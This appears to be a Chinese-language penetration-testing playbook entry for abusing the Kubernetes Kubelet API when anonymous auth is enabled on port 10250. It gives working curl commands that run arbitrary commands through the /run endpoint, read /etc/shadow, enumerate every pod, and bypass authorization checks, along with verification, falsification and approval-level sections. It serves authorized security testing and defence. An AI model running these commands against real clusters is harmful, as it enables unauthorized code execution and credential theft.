---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-2.7]
mapped_compliance_families: [Kubelet认证, API暴露]
---

# kubelet-api-abuse — Kubelet API 滥用

Kubelet 10250 端口开放匿名认证（`--anonymous-auth=true`）时，攻击者可绕过认证访问 Kubelet REST API，执行 `/run` 接口在容器内运行任意命令，或通过 `/pods` 泄露集群全部 Pod 元数据。

---

## 1. 前置条件

- Kubelet 10250 端口对外开放（入站可达）
- `--anonymous-auth=true` 配置启用匿名访问
- `--authorization-mode` 为 `AlwaysAllow` 或 Webhook 未正确收紧

检查命令：
```bash
# [L0] 宿主机观察：检查 Kubelet 启动参数中的 anonymous-auth
ps aux | grep kubelet | grep -o '\-\-anonymous-auth=[^ ]*'
# 期望输出: --anonymous-auth=true

# [L0] 宿主机观察：检查 Kubelet 监听端口
ss -tlnp | grep 10250
# 期望输出: LISTEN 0 ... 0.0.0.0:10250 ... kubelet
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 Kubelet 匿名认证配置
ps aux | grep kubelet | grep -oE '\-\-anonymous-auth=\S+ \-\-authorization-mode=\S+'
# 期望输出: --anonymous-auth=true --authorization-mode=AlwaysAllow（或 Webhook）

# [L1] 远程探测：curl 匿名访问 /pods 接口
curl -sk https://<node-ip>:10250/pods
# 期望输出: 返回 JSON 列出该节点全部 Pod 元数据

# [L1] 远程探测：curl 匿名访问根路径
curl -sk https://<node-ip>:10250/
# 期望输出: 400 Bad Request 或 Kubelet 错误页面（说明端口可达）

# [L1] 远程探测：验证匿名访问是否返回 Pod 列表
curl -sk https://<node-ip>:10250/pods | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d['items']),'pods')"
# 期望输出: N pods（节点上运行的 Pod 数量）

# [L1] 探测：验证 /run 接口是否可用（不执行破坏性命令）
curl -sk -X POST https://<node-ip>:10250/run/<ns>/<pod>/<container> -d "cmd=id" 2>&1 | head -5
# 期望输出: uid=0(root) gid=0(root) groups=0(root)
```

## 3. 攻击验证

```bash
# [L1] 攻击验证：通过 /run 接口执行命令读取容器内文件
curl -sk -X POST https://<node-ip>:10250/run/<ns>/<pod>/<container> -d "cmd=cat /etc/shadow"
# 期望输出: 容器内 /etc/shadow 内容（root:$6$...）

# [L2] 攻击验证：通过 Kubelet 在容器内建立反弹 shell 或写入标记
curl -sk -X POST https://<node-ip>:10250/run/<ns>/<pod>/<container> -d "cmd=sh -c 'echo kubelet-poc > /tmp/kubelet-escape-marker'"
# 期望输出: 无报错

# [L2] 宿主机/container端确认：标记文件已写入
kubectl exec -n <ns> <pod> -- cat /tmp/kubelet-escape-marker
# 期望输出: kubelet-poc

# [L2] 攻击验证：通过 /exec 接口（WebSocket）执行交互式命令
# 使用 kubectl exec 等价的底层 WebSocket 调用（需 specialized 工具，此处验证 /run 即可）

# [L1] 攻击验证：枚举所有 Pod 的 ServiceAccount Token 路径
curl -sk https://<node-ip>:10250/pods | python3 -c "
import sys, json
d = json.load(sys.stdin)
for pod in d['items']:
    for c in pod['spec']['containers']:
        print(pod['metadata']['namespace'], pod['metadata']['name'], c['name'])
"
# 期望输出: 全部 Pod 的 namespace/name/container（为后续针对性 exec 攻击提供目标）

# [L2] 清理
kubectl exec -n <ns> <pod> -- rm /tmp/kubelet-escape-marker
# 期望输出: 无报错
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录容器内 /tmp 文件列表
kubectl exec -n <ns> <pod> -- ls /tmp/ | sort
# 期望输出: 攻击前无 kubelet-escape-marker

# [L0] 攻击后环境对比：文件已通过 Kubelet API 写入
kubectl exec -n <ns> <pod> -- ls /tmp/ | sort
# 期望输出: 出现 kubelet-escape-marker

# [L1] 攻击前：无认证信息时 Kubelet /pods 接口
# 在认证严格的环境，无 Token 时返回 401
curl -sk https://<secure-node-ip>:10250/pods -o /dev/null -w '%{http_code}'
# 期望输出: 401（认证严格环境）

# [L1] 攻击后：匿名访问 /pods 接口返回 200
curl -sk https://<node-ip>:10250/pods -o /dev/null -w '%{http_code}'
# 期望输出: 200（匿名可达）→ 证明认证缺失

# [L1] 攻击前：无认证 /run 接口拒绝
curl -sk -X POST https://<secure-node-ip>:10250/run/<ns>/<pod>/<container> -d "cmd=id" -o /dev/null -w '%{http_code}'
# 期望输出: 403 或 401

# [L1] 攻击后：匿名 /run 接口返回命令执行结果
curl -sk -X POST https://<node-ip>:10250/run/<ns>/<pod>/<container> -d "cmd=id"
# 期望输出: uid=0(root) → 证明命令执行成功
```

差分结论：攻击前认证严格环境返回 401/403，攻击后匿名访问 Kubelet API 返回 200 并成功执行命令写入容器，证明 Kubelet 认证滥用成功。

## 5. 绕过策略

```bash
# [L1] 检查 Kubelet 授权模式是否为 Webhook
ps aux | grep kubelet | grep -oE '\-\-authorization-mode=\S+'
# 若输出 Webhook → 匿名用户权限受 RBAC 限制，但部分场景 allowed-delegated-auth 可能放行

# [L1] 检查 Kubelet 是否启用 readonly 端口 10255
ss -tlnp | grep 10255
# 若 10255 开放 → /pods 接口完全无认证，优先利用 10255

# [L0] 检查网络策略是否限制节点端口访问
kubectl get networkpolicy -A
# 若无限制 10250 的策略 → 集群内任意 Pod 可访问

# 绕过方式：
# - [L1] 若 --anonymous-auth=true 但 --authorization-mode=Webhook 拒绝 /run，尝试 10255（readonly）仅获取 /pods 情报
# - [L1] 若 Kubelet 要求客户端证书但不验证 CN，使用任意合法证书（如集群 CA 签发的 Pod 证书）绕过
# - [L2] 若 /run 接口受限，利用 /exec（WebSocket）接口在某些 Kubelet 版本绕过 RunCommandV2 限制
# - [L1] 若通过 Pod 内访问 Kubelet localhost:10250，多数网络策略不限制同节点流量
```

## 6. 证伪条件

```bash
# [L0] Kubelet 10250 端口未监听或仅监听 127.0.0.1
ss -tlnp | grep 10250
# 输出: 127.0.0.1:10250 或无输出 → 证伪（外部不可达）

# [L1] 匿名访问 /pods 返回 401
curl -sk https://<node-ip>:10250/pods -o /dev/null -w '%{http_code}'
# 输出: 401 → 证伪（认证已启用）

# [L1] 匿名访问 /run 返回 403
curl -sk -X POST https://<node-ip>:10250/run/<ns>/<pod>/<container> -d "cmd=id" -o /dev/null -w '%{http_code}'
# 输出: 403 → 证伪（授权已收紧）

# [L0] --anonymous-auth=false
ps aux | grep kubelet | grep -oE '\-\-anonymous-auth=\S+'
# 输出: --anonymous-auth=false → 证伪

# [L1] /pods 接口无 Pod 信息
curl -sk https://<node-ip>:10250/pods -o /dev/null -w '%{http_code}'
# 输出: 404 → 证伪（接口不存在或路径变更）
```

## 7. 审批级别

- **L2** 攻击验证（通过 /run 写入文件到容器）→ **Level 4**（在容器内执行任意命令，需人工确认）
- **L1** 远程探测（curl /pods、/run）→ **Level 2**（远程只读探测，自动执行）
- **L0** 宿主机观察（ps、ss）→ **Level 1**（只读侦察，自动执行）
- 破坏性标注：否
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Execution / Privilege Escalation
- **Technique ID**: T1611
- **Technique Name**: Escape to Host（此处广义为利用控制平面组件 API）
- **描述**: 攻击者利用 Kubelet 10250 端口的匿名认证配置，绕过认证访问 Kubelet REST API，枚举节点全部 Pod 元数据并通过 `/run` 接口在容器内执行任意命令。